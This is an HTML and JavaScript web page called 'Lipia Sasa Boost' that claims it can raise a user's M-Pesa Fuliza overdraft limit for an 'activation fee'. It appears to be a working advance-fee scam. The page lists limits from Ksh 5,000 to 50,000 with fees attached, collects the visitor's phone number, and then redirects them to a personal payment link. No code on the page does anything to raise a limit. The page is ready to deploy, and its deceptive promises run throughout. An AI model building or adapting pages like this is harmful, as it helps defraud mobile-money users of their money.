<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Boost Your Fuliza Limit | Get Instant Increase</title>
  
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">

  <style>
    :root {
      --primary: #2563eb;
      --secondary: #7c3aed;
      --gradient-bg: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      --text-dark: #1e293b;
      --text-muted: #64748b;
      --border-color: #e2e8f0;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Poppins', sans-serif; background: var(--gradient-bg); padding: 12px; }
    .container { max-width: 440px; margin: 0 auto; }
    
    .card { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); margin-top: 20px; }
    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 24px; }
    
    .loan-box { border: 2px solid #cbd5e1; border-radius: 10px; padding: 16px 12px; text-align: center; cursor: pointer; transition: 0.3s; }
    .loan-box.selected { border-color: var(--primary); background: #eff6ff; }
    .amount { font-size: 1.15rem; font-weight: 800; color: var(--primary); }
    .fee { font-size: 0.8rem; color: var(--text-muted); background: #f1f5f9; padding: 4px 10px; border-radius: 20px; margin-top: 8px; display: inline-block; }

    .input-wrapper { margin-bottom: 18px; text-align: left; width: 100%; }
    .input-label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 0.9rem; color: var(--text-dark); }
    
    .cta { 
      background: linear-gradient(135deg, var(--primary), var(--secondary)); 
      border-radius: 14px; padding: 18px; color: #fff; font-weight: 700; cursor: pointer; 
      border: none; width: 100%; font-size: 1rem; transition: transform 0.2s, box-shadow 0.2s;
    }
    
    .cta:hover:not(.disabled) { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3); }
    .cta.disabled { opacity: 0.6; cursor: not-allowed; }

    .hero-header {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      border-radius: 20px; padding: 32px 24px; text-align: center; color: white; margin-bottom: 24px;
    }

    .icon-badge {
      background: rgba(255, 255, 255, 0.2); width: 60px; height: 60px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
    }

    .hero-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 8px; }
    .hero-subtitle { font-size: 0.9rem; opacity: 0.9; margin-bottom: 20px; }

    .footer { background: #1e293b; border-radius: 20px; padding: 24px; margin-top: 32px; color: #fff; text-align: center; }
    .copyright { font-size: 0.8rem; opacity: 0.7; margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px; }
    
    /* Phone Input Styles for Popup */
    .phone-input-group { display: flex; border: 2px solid var(--border-color); border-radius: 10px; overflow: hidden; }
    .phone-prefix { background: #f8fafc; padding: 12px; font-weight: 700; border-right: 2px solid var(--border-color); }
    .phone-input { flex: 1; border: none; padding: 12px; outline: none; }
    .custom-input { width: 100%; padding: 12px; border: 2px solid var(--border-color); border-radius: 10px; }
  </style>
</head>
<body>

  <div class="container">
    <div class="hero-header">
      <div class="icon-badge"><i class="fas fa-bolt fa-2x"></i></div>
      <h1 class="hero-title">Lipia Sasa Boost</h1>
      <p class="hero-subtitle">Select your desired limit and pay the activation fee to upgrade instantly.</p>
    </div>

    <div class="card">
      <h3 style="margin-bottom:15px; color: var(--text-dark); text-align: center;">Select New Limit</h3>
      <div class="grid" id="loan-grid"></div>
      <button class="cta disabled" id="get-limit-btn" disabled>Select a Limit Above</button>
    </div>

    <footer class="footer">
      <div style="font-weight: 700; margin-bottom: 10px;">Fuliza Boost</div>
      <p style="font-size: 0.8rem; opacity: 0.8;">Secure and Automated Limit Increases</p>
      <p class="copyright">&copy; 2026 Fuliza Boost. All rights reserved.</p>
    </footer>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>

  <script>
    // Base Payment Link
    const BASE_PAYMENT_URL = "https://lipia-online.vercel.app/link/Paultech";

    const loanOptions = [
      { amount: 5000, fee: 49 }, { amount: 7500, fee: 75 },
      { amount: 10000, fee: 100 }, { amount: 12500, fee: 120 },
      { amount: 16000, fee: 150 }, { amount: 21000, fee: 200 },
      { amount: 25500, fee: 250 }, { amount: 30000, fee: 290 },
      { amount: 35000, fee: 340 }, { amount: 40000, fee: 410 },
      { amount: 45000, fee: 480 }, { amount: 50000, fee: 530 }
    ];

    let selectedLoan = null;
    const loanGrid = document.getElementById('loan-grid');
    const getBtn = document.getElementById('get-limit-btn');

    // Build the selection grid
    loanOptions.forEach(loan => {
      const box = document.createElement('div');
      box.className = 'loan-box';
      box.innerHTML = `
        <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
        <div class="fee">Fee: Ksh ${loan.fee}</div>
      `;
      box.onclick = () => {
        document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
        box.classList.add('selected');
        selectedLoan = loan;
        getBtn.classList.remove('disabled');
        getBtn.disabled = false;
        getBtn.innerText = `Upgrade to Ksh ${loan.amount.toLocaleString()}`;
      };
      loanGrid.appendChild(box);
    });

    // Handle the button click
    getBtn.onclick = async () => {
      if(!selectedLoan) return;

      const { value: formValues } = await Swal.fire({
        title: 'Recipient Details',
        html: `
          <div class="input-wrapper">
            <label class="input-label">M-Pesa Number</label>
            <div class="phone-input-group">
              <div class="phone-prefix">+254</div>
              <input id="swal-phone" class="phone-input" type="tel" placeholder="712345678" maxlength="9">
            </div>
          </div>
          <p style="font-size: 0.8rem; color: #666;">You will pay <b>Ksh ${selectedLoan.fee}</b> to activate this limit.</p>`,
        confirmButtonText: 'Pay Now',
        showCancelButton: true,
        preConfirm: () => {
          const phone = document.getElementById('swal-phone').value;
          if (!phone || phone.length !== 9) {
             Swal.showValidationMessage('Enter a valid 9-digit phone number');
             return false;
          }
          return { phone: '+254' + phone };
        }
      });

      if (formValues) {
        Swal.fire({
          title: 'Connecting...',
          text: `Redirecting to pay Ksh ${selectedLoan.fee}`,
          allowOutsideClick: false,
          didOpen: () => { Swal.showLoading(); }
        });
        
        // REDIRECTION LOGIC:
        // This takes the base link and appends the fee as a parameter.
        // Example: https://lipia-online.vercel.app/link/Paultech?amount=49
        const finalPaymentLink = `${BASE_PAYMENT_URL}?amount=${selectedLoan.fee}`;
        
        setTimeout(() => {
          window.location.href = finalPaymentLink;
        }, 1200);
      }
    };
  </script>
</body>
</html>
